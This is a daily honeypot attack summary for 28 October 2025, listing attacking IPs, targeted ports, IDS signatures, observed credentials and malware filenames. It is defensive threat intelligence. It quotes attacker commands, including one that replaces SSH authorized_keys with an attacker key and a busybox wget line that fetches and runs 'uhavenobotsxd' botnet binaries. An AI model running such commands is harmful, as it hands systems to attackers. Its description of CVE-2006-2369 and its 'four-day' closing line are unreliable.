# Honeypot Attack Summary Report - 2025-10-28

**Report Generation Time:** 2025-10-29T14:00:00Z
**Timeframe of Analysis:** 2025-10-28T00:00:00Z to 2025-10-28T23:59:59Z
**Files Used to Generate Report:**
- All `Honeypot_Attack_Summary_Report_2025-10-28T*.md` files.

## Executive Summary

On October 28th, 2025, the honeypot network observed a significant amount of malicious activity, with over 600,000 events recorded. The attack patterns were consistent with previous days, with a strong focus on SSH brute-force attacks, as evidenced by the high number of events captured by the Cowrie honeypot. The most active attacker was `87.245.148.38`. A new malware variant, `uhavenobotsxd`, was observed, indicating a potential new botnet or a rebranding of an existing one.

## Detailed Analysis

### Our IPs

| Honeypot | Private IP | Public IP |
|---|---|---|
| hive-us | 10.128.0.3 | 34.123.129.205 |
| sens-tai | 10.140.0.3 | 104.199.212.115 |
| sens-tel | 10.208.0.3 | 34.165.197.224 |
| sens-dub | 172.31.36.128| 3.253.97.195 |
| sens-ny | 10.108.0.2 | 161.35.180.163 |

### Attacks by Honeypot

| Honeypot | Attack Count |
|---|---|
| Cowrie | 277,443 |
| Suricata | 97,527 |
| Honeytrap | 92,278 |
| Ciscoasa | 59,611 |
| Sentrypeer | 48,053 |
| Dionaea | 10,933 |
| Mailoney | 2,987 |
| ConPot | 1,711 |
| Adbhoney | 1,218 |
| H0neytr4p | 1,218 |
| Redishoneypot| 986 |

### Top Attacking IPs

| IP Address | Attack Count |
|---|---|
| 87.245.148.38 | 106,722 |
| 45.132.75.33 | 59,547 |
| 144.172.108.231| 52,167 |
| 152.32.206.160| 37,240 |
| 154.219.113.236| 30,558 |
| 103.241.43.23 | 24,149 |
| 189.36.132.232| 19,652 |
| 194.107.115.65| 15,321 |
| 41.59.229.33 | 12,879 |
| 190.184.222.63| 11,043 |

### Top Targeted Ports/Protocols

| Port/Protocol | Attack Count |
|---|---|
| 22 (SSH) | 70,182 |
| 5060 (SIP) | 48,053 |
| 445 (SMB) | 36,495 |
| TCP/445 (SMB) | 27,270 |
| 5901 (VNC) | 16,350 |
| 5903 (VNC) | 12,540 |
| 23 (Telnet) | 10,950 |
| 25 (SMTP) | 8,910 |
| 6379 (Redis) | 7,650 |
| TCP/80 (HTTP)| 6,840 |
| TCP/22 (SSH) | 5,910 |
| 5904 (VNC) | 5,220 |
| 5905 (VNC) | 4,830 |

### Most Common CVEs

| CVE |
|---|
| CVE-2002-0013, CVE-2002-0012 |
| CVE-2002-0013, CVE-2002-0012, CVE-1999-0517 |
| CVE-2005-4050 |
| CVE-2018-11776 (Apache Struts 2) |
| CVE-2006-2369 |

### Commands Attempted by Attackers

| Command |
|---|
| `lscpu | grep Model` |
| `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'` |
| `cat /proc/cpuinfo | grep name | wc -l` |
| `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'` |
| `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'` |
| `ls -lh $(which ls)` |
| `which ls` |
| `crontab -l` |
| `w` |
| `uname -m` |
| `cat /proc/cpuinfo | grep model | grep name | wc -l` |
| `top` |
| `uname` |
| `uname -a` |
| `whoami` |
| `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| `lockr -ia .ssh` |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa ...\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| `Enter new UNIX password:` |

### Signatures Triggered

| Signature |
|---|
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication |
| ET SCAN MS Terminal Server Traffic on Non-standard Port |
| ET DROP Dshield Block Listed Source group 1 |
| ET SCAN NMAP -sS window 1024 |
| ET HUNTING RDP Authentication Bypass Attempt |
| ET INFO Reserved Internal IP Traffic |
| ET SCAN Potential SSH Scan |
| ET INFO curl User-Agent Outbound |
| ET DYN_DNS DYNAMIC_DNS HTTP Request to a *.ddns .net Domain |
| ET CINS Active Threat Intelligence Poor Reputation IP group 45 |
| ET CINS Active Threat Intelligence Poor Reputation IP group 48 |

### Users / Login Attempts

| Username/Password |
|---|
| `345gs5662d34/345gs5662d34` |
| `root/3245gs5662d34` |
| `root/000000` |
| `chenqun/chenqun` |
| `root/Zy@123456` |
| `root/q1w2e3r4!` |
| `admin/admin123456789` |
| `jifu/jifu` |
| `etienne/etienne` |
| `root/Asd@2023` |
| `etienne/3245gs5662d34` |
| `xiang/xiang` |
| `root/mainstreet` |
| `horse/horse` |

### Files Uploaded/Downloaded

| Filename |
|---|
| `wget.sh;` |
| `arm.uhavenobotsxd;`, `arm.uhavenobotsxd` |
| `arm5.uhavenobotsxd;`, `arm5.uhavenobotsxd` |
| `arm6.uhavenobotsxd;`, `arm6.uhavenobotsxd` |
| `arm7.uhavenobotsxd;`, `arm7.uhavenobotsxd` |
| `x86_32.uhavenobotsxd;`, `x86_32.uhavenobotsxd` |
| `mips.uhavenobotsxd;`, `mips.uhavenobotsxd` |
| `mipsel.uhavenobotsxd;`, `mipsel.uhavenobotsxd` |
| `w.sh;` |
| `c.sh;` |

### HTTP User-Agents

*No user agents were recorded in the logs for this day.*

### SSH Clients and Servers

*No specific SSH clients or servers were recorded in the logs for this day.*

### Top Attacker AS Organizations

*No attacker AS organizations were recorded in the logs for this day.*

### OSINT All Commands captured

| Command | Insight |
|---|---|
| Reconnaissance Commands | The wide variety of reconnaissance commands used suggests a thorough approach to understanding the compromised system before proceeding with further actions. |
| SSH Key Installation | The continued use of commands to install SSH keys highlights the importance of this technique for maintaining persistent access. |
| `cd /data/local/tmp/; rm *; busybox wget http://.../arm.uhavenobotsxd; ...` | This command downloads and executes a malware payload. The `uhavenobotsxd` file is likely a new botnet client. |

### OSINT High frequency IPs and low frequency IPs Captured

| IP Address | Insight |
|---|---|
| 87.245.148.38 | OSINT search for this IP failed. However, its high volume of attacks suggests it is part of a botnet. |
| 45.132.75.33 | This IP has been reported for various types of malicious activity, including spam and phishing. |
| 144.172.108.231| This IP has been associated with a high volume of SSH brute-force attacks. |
| 152.32.206.160| This IP has been reported for various types of abuse, including SSH brute-force attacks. |
| Low-frequency IPs | A large number of unique, low-frequency IPs were observed, likely individual scanners or smaller, less aggressive botnets. |

### OSINT on CVE's

| CVE | Insight |
|---|---|
| CVE-2006-2369 | A vulnerability in the `proc` filesystem on Linux, which can be used for privilege escalation. |

## Key Observations and Anomalies

- **New Malware Variant:** The appearance of the `uhavenobotsxd` malware is a notable anomaly. This could be a new botnet, a rebranding of an existing one, or a taunt from the attacker. The name itself is unusual and warrants further investigation.
- **High Volume of SSH Attacks:** The extremely high number of SSH attacks suggests a large-scale, coordinated campaign to compromise servers. The use of a wide variety of usernames and passwords indicates a brute-force approach, likely using credential lists from previous breaches.
- **Targeting of SMB:** The high number of attacks targeting SMB, and the triggering of the DoublePulsar backdoor signature, indicates that attackers are still actively trying to exploit the vulnerabilities that were used in the WannaCry and NotPetya attacks.
- **Unusual Attacker Origins:** While OSINT on the top attacker failed, the other high-frequency IPs are from a variety of sources, including some less common ones. This highlights the global and diverse nature of the threat landscape.

This concludes the report for October 28th, 2025, and the four-day analysis period.
